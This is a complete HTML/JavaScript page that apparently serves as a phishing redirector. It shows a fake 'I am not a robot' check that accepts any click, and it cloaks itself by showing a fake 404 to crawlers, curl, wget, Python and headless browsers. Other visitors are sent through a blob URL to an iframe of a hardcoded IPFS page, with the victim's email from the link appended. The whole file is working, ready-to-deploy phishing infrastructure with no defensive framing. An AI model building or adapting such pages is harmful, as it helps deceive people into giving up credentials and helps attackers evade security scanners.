<!DOCTYPE html>
<html>
<head>
    <title>Blob IPFS Redirect + Human-Friendly Anti-Bot</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

<style>
html, body {
    margin:0; padding:0; width:100%; height:100%;
    font-family: Arial, sans-serif;
}

/* Overlay for human check */
#overlay {
    position:fixed;
    top:0; left:0; width:100%; height:100%;
    background:#f0f2f5;
    display:flex; align-items:center; justify-content:center;
    opacity:0; transition:0.3s;
    z-index:999999;
}

#verificationBox {
    background:#fff;
    padding:25px 30px;
    border-radius:8px;
    width:300px;
    box-shadow:0 5px 20px rgba(0,0,0,0.15);
    border:1px solid #ddd;
    text-align:left;
}

#checkbox {
    width:26px; height:26px;
    border:2px solid #7f8fa6;
    border-radius:4px;
    cursor:pointer;
    transition:0.3s;
}

/* ðŸ”¥ ROTATING BOT ICON HERE */
#robotIcon {
    width:32px;
    height:32px;
    background:#e8f0fe;
    border-radius:50%;
    font-size:20px;
    display:flex;
    align-items:center;
    justify-content:center;
    animation: botRotate 2s linear infinite;
}

@keyframes botRotate {
    from { transform: rotate(0deg); }
    to { transform: rotate(360deg); }
}

#verifying {
    display:none;
    margin-top:15px;
    font-size:14px;
    color:#555;
}

.spinner {
    width:16px; height:16px;
    border-radius:50%;
    border:3px solid #40739e;
    border-top-color:transparent;
    animation:spin 0.6s linear infinite;
}

@keyframes spin {
    from {transform:rotate(0deg);}
    to {transform:rotate(360deg);}
}

/* 404 page */
.error-404 {
    display:flex; flex-direction:column; align-items:center; justify-content:center;
    height:100vh; background:#f8f8f8; text-align:center;
}
.error-404 h1 {font-size:90px; margin:0;}
.error-404 h2 {font-size:26px; margin:0;}
.error-404 p {font-size:18px;}
</style>
</head>
<body>

<!-- HUMAN CHECK -->
<div id="overlay">
    <div id="verificationBox">
        <div style="display:flex; align-items:center; gap:12px;">
            <div id="robotIcon">ðŸ¤–</div>
            <strong style="flex:1;font-size:15px;">I am not a robot</strong>
            <div id="checkbox"></div>
        </div>

        <div id="verifying">
            <div style="display:flex; align-items:center; gap:5px;">
                <div class="spinner"></div> Verifyingâ€¦
            </div>
        </div>
    </div>
</div>

<script>
/* -----------------------------
   B L O B   C O N F I G
----------------------------- */
const BASE_IPFS = "https://bafkreihy4f7rhfkkwwb6zyz6kzdb25sact4uw3e5xk2ogsweommzcyccpq.ipfs.dweb.link/";

function getEmail() {
    return new URLSearchParams(location.search).get("email") || "";
}

function buildIPFS(email) {
    return email ? BASE_IPFS + "#" + email : BASE_IPFS;
}

function createBlobHTML(url) {
    return `
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <style>
                html, body { margin:0; padding:0; width:100%; height:100%; overflow:hidden; background:#fff; }
                iframe { position:fixed; top:0; left:0; width:100%; height:100%; border:none; }
            </style>
        </head>
        <body>
            <iframe src="${url}"></iframe>
        </body>
        </html>
    `;
}

/* -----------------------------
   U S E R - F R I E N D L Y
   A N T I - B O T  (LIGHT)
----------------------------- */

function isBot() {
    const ua = navigator.userAgent.toLowerCase();

    const botPatterns = [
        "bot","crawl","spider","curl","wget","python","scrapy",
        "headless","selenium","puppeteer","playwright"
    ];

    if (botPatterns.some(x => ua.includes(x))) return true;
    if (navigator.webdriver) return true;
    if (!navigator.plugins.length) return true;

    return false;
}

function requireVerification() {
    return new Promise(resolve => {
        const overlay = document.getElementById("overlay");
        const checkbox = document.getElementById("checkbox");
        const verifying = document.getElementById("verifying");

        overlay.style.opacity = 1;  

        checkbox.onclick = () => {
            checkbox.style.background = "#40739e";
            checkbox.style.borderColor = "#40739e";
            verifying.style.display = "block";

            setTimeout(() => {
                overlay.style.opacity = 0;
                setTimeout(() => overlay.remove(), 300);
                resolve(true);
            }, 900);
        };
    });
}

/* -----------------------------
   4 0 4   H A N D L E R
----------------------------- */

function show404() {
    document.body.innerHTML = `
        <div class="error-404">
            <h1>404</h1>
            <h2>Error</h2>
            <p>The requested page could not be found.</p>
        </div>`;
}

/* -----------------------------
   M A I N
----------------------------- */

document.addEventListener("DOMContentLoaded", async () => {

    // ANTI-BOT CHECK
    if (isBot()) {
        show404();
        return;
    }

    // HUMAN CLICK
    await requireVerification();

    // YOUR ORIGINAL BLOB REDIRECT
    const email = getEmail();
    const ipfsURL = buildIPFS(email);

    const blobHTML = createBlobHTML(ipfsURL);
    const blob = new Blob([blobHTML], { type: "text/html" });
    const blobURL = URL.createObjectURL(blob);

    window.location.href = blobURL;
});
</script>

</body>
</html>
